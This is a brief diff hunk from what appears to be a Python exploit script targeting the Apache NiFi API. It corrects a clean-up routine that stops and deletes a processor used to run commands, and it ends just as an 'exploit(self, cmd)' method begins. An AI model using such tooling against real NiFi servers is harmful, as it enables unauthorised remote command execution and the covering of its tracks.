@@ -20,7 +20,7 @@ class Exp:
     def clean_up(self, p_id):
         url = self.url + "/nifi-api/processors/" + p_id
         data = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}
-        req.put(url=url, data=json.dumps(data), verify=False)
+        req.put(url=url + "/run-status", data=json.dumps(data), verify=False)
         req.delete(url + "/threads", verify=False)
 
     def exploit(self, cmd):
